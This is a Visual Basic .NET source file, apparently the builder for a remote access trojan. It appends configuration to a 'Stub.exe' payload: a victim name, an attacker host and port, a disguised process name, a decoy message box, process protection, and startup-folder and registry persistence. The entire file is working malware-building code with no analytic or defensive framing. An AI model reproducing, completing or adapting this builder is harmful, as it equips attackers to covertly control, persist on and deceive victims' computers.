Imports System.Text

Public Class Form1

    Private Function EEE(ByVal Nome As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(Nome))
    End Function

    Private Sub btn_OK_Click(sender As Object, e As EventArgs) Handles btn_OK.Click

        Dim I As New SaveFileDialog

        I.Title = "SALVAR ARQUIVOS"

        I.Filter = "ARQUIVOS(*.exe)|*.exe|TODOS ARQUIVOS (*.*)|*.*"

        If I.ShowDialog = DialogResult.OK Then

            Dim Y As String = "|ST|"

            Dim Stub As String

            FileOpen(1, "Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)

            Stub = Space(LOF(1))

            FileGet(1, Stub)

            FileClose(1)

            '#########################################################################

            FileOpen(1, I.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

            FilePut(1, Stub & Y & EEE(TXT_NomeVitima.Text) & Y & TXT_Host.Text & Y & ND_Porta.Value & Y & CK_Copy.Checked.ToString & Y & TXT_NomeProcess.Text & Y & CB_Diretorio.Text & Y & CK_Msgbox.Checked.ToString & Y & TXT_Titulo.Text & Y & TXT_Mensagem.Text & Y & CK_ProtectProcess.Checked.ToString & Y & CK_CopyStartUp.Checked.ToString & Y & CK_RegistryStartUp.Checked.ToString & Y)

            FileClose(1)

            MsgBox(I.FileName)

        End If

    End Sub
End Class
